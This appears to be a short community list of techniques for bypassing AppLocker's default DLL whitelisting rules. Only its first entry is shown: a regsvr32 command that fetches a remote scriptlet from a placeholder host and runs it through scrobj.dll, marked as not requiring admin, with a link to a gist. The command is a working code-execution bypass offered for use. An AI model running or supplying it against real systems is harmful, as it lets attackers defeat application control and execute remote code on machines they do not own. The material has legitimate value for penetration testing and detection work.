# Bypass DLL Default AppLocker Rules
The goal of this list is document a verified list of known bypasses using AppLocker Default Rules for DLL whitelisting.
Please contribute and do point out errors or resources I have forgotten.


## 1. regsvr32.exe

regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

Requires admin: No

Links:  
https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302

